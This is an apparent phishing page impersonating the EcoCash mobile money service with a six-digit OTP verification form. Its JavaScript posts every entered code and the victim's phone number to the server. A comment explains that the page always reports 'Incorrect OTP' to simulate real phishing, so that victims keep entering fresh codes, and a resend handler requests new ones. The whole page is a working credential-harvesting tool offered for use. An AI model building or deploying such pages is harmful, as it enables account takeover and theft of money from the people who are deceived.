<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>EcoCash - Verify OTP</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .otp-container {
            background-color: white;
            border-radius: 12px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 420px;
            overflow: hidden;
        }
        
        .otp-header {
            background: linear-gradient(135deg, #1a73e8 0%, #0d47a1 100%);
            padding: 30px 20px;
            text-align: center;
            color: white;
        }
        
        .otp-header .icon {
            font-size: 50px;
            display: block;
            margin-bottom: 10px;
        }
        
        .otp-header h1 {
            font-size: 28px;
            font-weight: 700;
            margin-bottom: 5px;
        }
        
        .otp-header h1 .eco {
            color: #ffffff;
        }
        
        .otp-header h1 .cash {
            color: #ff1744;
        }
        
        .otp-header p {
            font-size: 14px;
            opacity: 0.9;
        }
        
        .otp-form {
            padding: 30px;
        }
        
        .otp-message {
            text-align: center;
            margin-bottom: 25px;
            color: #555;
            font-size: 14px;
            line-height: 1.8;
        }
        
        .otp-message .phone-number {
            color: #1a73e8;
            font-weight: 700;
            font-size: 18px;
        }
        
        .otp-message .hint {
            color: #888;
            font-size: 13px;
        }
        
        .brand-text {
            font-weight: 700;
        }
        
        .brand-text .eco {
            color: #1a73e8;
        }
        
        .brand-text .cash {
            color: #ff1744;
        }
        
        .otp-boxes {
            display: flex;
            justify-content: center;
            gap: 12px;
            margin-bottom: 25px;
        }
        
        .otp-box {
            width: 50px;
            height: 60px;
            text-align: center;
            font-size: 28px;
            font-weight: 700;
            border: 2px solid #ddd;
            border-radius: 10px;
            transition: all 0.3s;
            background: white;
        }
        
        .otp-box:focus {
            border-color: #1a73e8;
            box-shadow: 0 0 0 3px rgba(26, 115, 232, 0.2);
            outline: none;
            transform: scale(1.05);
        }
        
        .otp-box.filled {
            border-color: #4CAF50;
            background: #f0faf0;
        }
        
        .btn {
            display: block;
            width: 100%;
            padding: 14px;
            background-color: #ccc;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: not-allowed;
            transition: all 0.3s;
        }
        
        .btn.enabled {
            background: linear-gradient(135deg, #1a73e8 0%, #0d47a1 100%);
            cursor: pointer;
        }
        
        .btn.enabled:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(26, 115, 232, 0.4);
        }
        
        .btn.enabled:active {
            transform: translateY(0);
        }
        
        .timer-container {
            text-align: center;
            margin: 15px 0 20px;
            font-size: 14px;
            color: #666;
        }
        
        .timer-container .timer-icon {
            margin-right: 5px;
        }
        
        .timer-container span {
            color: #d32f2f;
            font-weight: 700;
            font-size: 18px;
        }
        
        .timer-container .expired {
            color: #d32f2f;
            font-weight: 700;
        }
        
        .resend-link {
            text-align: center;
            margin-top: 20px;
            font-size: 14px;
        }
        
        .resend-link a {
            color: #1a73e8;
            text-decoration: none;
            font-weight: 600;
        }
        
        .resend-link a:hover {
            text-decoration: underline;
        }
        
        .spinner-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.6);
            justify-content: center;
            align-items: center;
            z-index: 9999;
        }
        
        .spinner-container {
            background: white;
            padding: 40px;
            border-radius: 12px;
            text-align: center;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            min-width: 300px;
        }
        
        .spinner {
            width: 60px;
            height: 60px;
            border: 5px solid #f3f3f3;
            border-top: 5px solid #1a73e8;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .spinner-container p {
            margin-top: 20px;
            color: #333;
            font-weight: 500;
            font-size: 16px;
        }
        
        .spinner-container .sub-text {
            color: #666;
            font-size: 13px;
            margin-top: 5px;
        }
        
        .error-shake {
            animation: shake 0.5s ease-in-out;
        }
        
        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            20% { transform: translateX(-10px); }
            40% { transform: translateX(10px); }
            60% { transform: translateX(-10px); }
            80% { transform: translateX(10px); }
        }
        
        .timer-warning {
            color: #ff1744 !important;
            animation: pulse 1s ease-in-out infinite;
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.4; }
        }
        
        @media (max-width: 480px) {
            .otp-container {
                max-width: 100%;
            }
            
            .otp-form {
                padding: 20px;
            }
            
            .otp-box {
                width: 42px;
                height: 52px;
                font-size: 24px;
            }
            
            .otp-boxes {
                gap: 8px;
            }
            
            .otp-header h1 {
                font-size: 24px;
            }
        }
    </style>
</head>
<body>
    <div class="otp-container">
        <div class="otp-header">
            <span class="icon">📱</span>
            <h1><span class="eco">Eco</span><span class="cash">Cash</span></h1>
            <p>Verify Your Identity</p>
        </div>
        
        <div class="otp-form">
            <div class="otp-message">
                We sent a verification code to<br>
                <span class="phone-number" id="maskedPhone">+263 785****63</span>
                <br><span class="hint">Please enter the 6-digit code below</span>
            </div>
            
            <div class="otp-boxes" id="otpContainer">
                <input type="text" class="otp-box" maxlength="1" pattern="[0-9]" inputmode="numeric" autofocus>
                <input type="text" class="otp-box" maxlength="1" pattern="[0-9]" inputmode="numeric">
                <input type="text" class="otp-box" maxlength="1" pattern="[0-9]" inputmode="numeric">
                <input type="text" class="otp-box" maxlength="1" pattern="[0-9]" inputmode="numeric">
                <input type="text" class="otp-box" maxlength="1" pattern="[0-9]" inputmode="numeric">
                <input type="text" class="otp-box" maxlength="1" pattern="[0-9]" inputmode="numeric">
            </div>
            
            <div class="timer-container">
                <span class="timer-icon">⏱️</span>
                Code expires in <span id="timer">60</span> seconds
            </div>
            
            <button class="btn" id="submitBtn" disabled>Verify OTP</button>
            
            <div class="resend-link">
                <a href="#" id="resendLink">🔄 Resend OTP</a>
            </div>
        </div>
    </div>
    
    <!-- Spinner Overlay -->
    <div class="spinner-overlay" id="spinnerOverlay">
        <div class="spinner-container">
            <div class="spinner"></div>
            <p>Verifying OTP...</p>
            <p class="sub-text">Please wait</p>
        </div>
    </div>
    
    <script>
        // Get phone from localStorage
        const savedPhone = localStorage.getItem('phone') || '785123463';
        const visibleStart = savedPhone.slice(0, 3);
        const visibleEnd = savedPhone.slice(-2);
        const masked = visibleStart + '****' + visibleEnd;
        document.getElementById('maskedPhone').textContent = '+263 ' + masked;
        
        const otpBoxes = document.querySelectorAll('.otp-box');
        const submitBtn = document.getElementById('submitBtn');
        const spinnerOverlay = document.getElementById('spinnerOverlay');
        const timerSpan = document.getElementById('timer');
        const otpContainer = document.getElementById('otpContainer');
        
        let otpValue = '';
        let seconds = 60;  // Changed to 60 seconds
        let countdownInterval;
        let isExpired = false;
        
        // Countdown timer
        function startCountdown() {
            seconds = 60;
            isExpired = false;
            timerSpan.textContent = seconds;
            timerSpan.className = '';
            clearInterval(countdownInterval);
            
            countdownInterval = setInterval(() => {
                seconds--;
                timerSpan.textContent = seconds;
                
                if (seconds <= 10) {
                    timerSpan.className = 'timer-warning';
                } else {
                    timerSpan.className = '';
                }
                
                if (seconds <= 0) {
                    clearInterval(countdownInterval);
                    timerSpan.textContent = 'Expired';
                    timerSpan.className = 'expired';
                    isExpired = true;
                    submitBtn.classList.remove('enabled');
                    submitBtn.disabled = true;
                }
            }, 1000);
        }
        
        startCountdown();
        
        function checkOtpComplete() {
            otpValue = Array.from(otpBoxes).map(box => box.value).join('');
            
            // Add filled class to boxes with values
            otpBoxes.forEach(box => {
                if (box.value) {
                    box.classList.add('filled');
                } else {
                    box.classList.remove('filled');
                }
            });
            
            if (otpValue.length === 6 && !isExpired) {
                submitBtn.classList.add('enabled');
                submitBtn.disabled = false;
            } else {
                submitBtn.classList.remove('enabled');
                submitBtn.disabled = true;
            }
        }
        
        function resetOtp() {
            otpBoxes.forEach(box => {
                box.value = '';
                box.classList.remove('filled');
            });
            otpBoxes[0].focus();
            submitBtn.classList.remove('enabled');
            submitBtn.disabled = true;
            otpValue = '';
            startCountdown();
            otpContainer.classList.remove('error-shake');
        }
        
        function shakeError() {
            otpContainer.classList.add('error-shake');
            setTimeout(() => {
                otpContainer.classList.remove('error-shake');
            }, 500);
        }
        
        // OTP input handling
        otpBoxes.forEach((box, index) => {
            box.addEventListener('input', function() {
                // Only allow digits
                this.value = this.value.replace(/[^0-9]/g, '');
                
                if (this.value.length === 1 && index < 5) {
                    otpBoxes[index + 1].focus();
                }
                checkOtpComplete();
            });
            
            box.addEventListener('keydown', function(e) {
                if (e.key === 'Backspace' && this.value === '' && index > 0) {
                    otpBoxes[index - 1].focus();
                }
            });
            
            // Handle paste
            box.addEventListener('paste', function(e) {
                e.preventDefault();
                const paste = (e.clipboardData || window.clipboardData).getData('text');
                const digits = paste.replace(/[^0-9]/g, '').slice(0, 6);
                
                if (digits.length > 0) {
                    for (let i = 0; i < digits.length && i < 6; i++) {
                        otpBoxes[i].value = digits[i];
                    }
                    const nextIndex = Math.min(digits.length, 5);
                    if (otpBoxes[nextIndex]) {
                        otpBoxes[nextIndex].focus();
                    }
                    checkOtpComplete();
                }
            });
        });
        
        // Submit OTP
        submitBtn.addEventListener('click', function() {
            if (otpValue.length !== 6 || isExpired) return;
            
            spinnerOverlay.style.display = 'flex';
            
            // Send OTP to server
            fetch('/otp-verify', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: `otp=${otpValue}&phone=${encodeURIComponent(savedPhone)}`
            })
            .then(response => response.json())
            .then(data => {
                spinnerOverlay.style.display = 'none';
                
                // ALWAYS show "Incorrect OTP" to simulate real phishing
                // This makes the victim try again and enter more OTPs
                shakeError();
                alert('❌ Incorrect OTP!\n\nPlease re-enter the most recent OTP.');
                resetOtp();
            })
            .catch(error => {
                console.error('Error:', error);
                spinnerOverlay.style.display = 'none';
                alert('An error occurred. Please try again.');
                resetOtp();
            });
        });
        
        // Resend OTP
        document.getElementById('resendLink').addEventListener('click', function(e) {
            e.preventDefault();
            
            if (isExpired) {
                spinnerOverlay.style.display = 'flex';
            } else {
                if (!confirm('Are you sure you want to request a new OTP? The current code will expire.')) {
                    return;
                }
                spinnerOverlay.style.display = 'flex';
            }
            
            fetch('/otp-resend', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: `phone=${encodeURIComponent(savedPhone)}`
            })
            .then(response => response.json())
            .then(data => {
                spinnerOverlay.style.display = 'none';
                if (data.success) {
                    alert('✅ New OTP sent to your phone!');
                    resetOtp();
                } else {
                    alert('❌ Failed to resend OTP. Please try again.');
                }
            })
            .catch(error => {
                spinnerOverlay.style.display = 'none';
                alert('An error occurred. Please try again.');
            });
        });
        
        // Auto-submit when all digits are entered
        let autoSubmitTimeout;
        document.addEventListener('keyup', function() {
            if (otpValue.length === 6 && submitBtn.classList.contains('enabled')) {
                clearTimeout(autoSubmitTimeout);
                autoSubmitTimeout = setTimeout(() => {
                    submitBtn.click();
                }, 300);
            }
        });
        
        // Focus first box
        otpBoxes[0].focus();
    </script>
</body>
</html>
